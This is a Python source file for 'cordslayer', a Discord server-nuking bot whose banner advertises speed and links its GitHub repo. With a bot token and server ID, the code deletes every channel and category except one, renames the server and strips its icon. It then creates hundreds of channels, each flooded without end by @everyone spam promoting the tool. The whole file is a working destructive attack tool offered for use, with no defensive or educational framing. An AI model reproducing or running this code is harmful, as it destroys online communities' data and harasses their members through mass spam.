import discord
from discord.ext import commands
from colorama import init, Fore
import asyncio
import fade
cordslayer = '''
   .aMMMb  .aMMMb  dMMMMb  dMMMMb  .dMMMb  dMP     .aMMMb  dMP dMP dMMMMMP dMMMMb 
  dMP"VMP dMP"dMP dMP.dMP dMP VMP dMP" VP dMP     dMP"dMP dMP.dMP dMP     dMP.dMP 
 dMP     dMP dMP dMMMMK" dMP dMP  VMMMb  dMP     dMMMMMP  VMMMMP dMMMP   dMMMMK"  
dMP.aMP dMP.aMP dMP"AMF dMP.aMP dP .dMP dMP     dMP dMP dA .dMP dMP     dMP"AMF   
VMMMP"  VMMMP" dMP dMP dMMMMP"  VMMMP" dMMMMMP dMP dMP  VMMMP" dMMMMMP dMP dMP    

4 threads
extreme speed
easy to use
free

https://github.com/kikmanONTOP/cordslayer'''

faded_text = fade.greenblue(cordslayer)
print(faded_text)
r = Fore.RED
g = Fore.GREEN
intents = discord.Intents.all()
bot = discord.Client(intents=intents)

async def send_message_periodically(channel, spam_message):
    while True:
        await channel.send("CORDSLAYER HAS BEEN SUMMONED @everyone DOWNLOAD THIS TOOL https://github.com/kikmanONTOP/cordslayer " + spam_message)
        await asyncio.sleep(0)
        print(g + "spammed:", channel.name)

async def create_channels(guild, channel_name, spam_message):
    for i in range(333):
        try:
            channel = await guild.create_text_channel(channel_name)
            await asyncio.sleep(0)
            print(g + "created:", channel.name)
            bot.loop.create_task(send_message_periodically(channel, spam_message))
        except Exception as e:
            print(r + f"Error creating channel {channel_name}: {e}")

@bot.event
async def on_ready():
    print(f"Lets troll with {bot.user}")
    guild_id = input("server id: ")
    spam_message = input("spam message: ")
    new_channels_name = input("new channels name: ")

    guild = bot.get_guild(int(guild_id))

    if guild is None:
        print(r + "server id error")
        return

    if guild:
        ignore_channel_name = "NXWY SMRDI"

        categories = [category for category in guild.categories if category.name != ignore_channel_name]
        text_channels = [channel for channel in guild.text_channels if channel.name != ignore_channel_name]
        voice_channels = [channel for channel in guild.voice_channels if channel.name != ignore_channel_name]

        for channel in text_channels:
            try:
                await channel.delete()
                await asyncio.sleep(0)
                print(g + "deleted:", channel.name)
            except Exception as e:
                print(r + f"Error deleting text channel {channel.name}: {e}")

        for channel in voice_channels:
            try:
                await channel.delete()
                await asyncio.sleep(0)
                print(g + "deleted:", channel.name)
            except Exception as e:
                print(r + f"Error deleting voice channel {channel.name}: {e}")

        for category in categories:
            try:
                await category.delete()
                await asyncio.sleep(0)
                print(g + "deleted", category.name)
            except Exception as e:
                print(r + f"Error deleting category {category.name}: {e}")

        try:
            await guild.edit(name="cordslayer was here")
            print(g + "server name changed")
        except Exception as e:
            print(r + f"Error changing server name: {e}")

        try:
            await guild.edit(icon=None)
            print(g + "server pfp changed")
        except Exception as e:
            print(r + f"Error changing server pfp: {e}")

        create_channel_task = asyncio.create_task(create_channels(guild, new_channels_name, spam_message))
        create_channel_task2 = asyncio.create_task(create_channels(guild, new_channels_name, spam_message))
        create_channel_task3 = asyncio.create_task(create_channels(guild, new_channels_name, spam_message))
        create_channel_task4 = asyncio.create_task(create_channels(guild, new_channels_name, spam_message))
        await create_channel_task
        await create_channel_task2
        await create_channel_task3
        await create_channel_task4
token = input(Fore.LIGHTCYAN_EX + "discord bot token: ")
bot.run(token)
